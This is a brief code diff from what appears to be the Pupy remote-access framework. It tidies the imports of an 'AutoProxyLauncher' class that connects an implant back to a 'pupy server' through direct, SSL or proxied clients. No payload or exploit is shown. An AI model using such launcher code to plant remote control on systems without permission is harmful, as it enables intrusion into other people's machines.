@@ -6,11 +6,10 @@ __all__ = [ 'AutoProxyLauncher' ]
 
 import network
 import argparse
-import logging
 
 from network.lib import utils
 
-from ..base_launcher import *
+from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
 from ..proxies import get_proxies
 
@@ -28,6 +27,7 @@ class AutoProxyLauncher(BaseLauncher):
 
     def __init__(self, *args, **kwargs):
         super(AutoProxyLauncher, self).__init__(*args, **kwargs)
+
     def init_argparse(self):
         self.arg_parser = LauncherArgumentParser(prog="auto_proxy", description=self.__doc__)
         self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
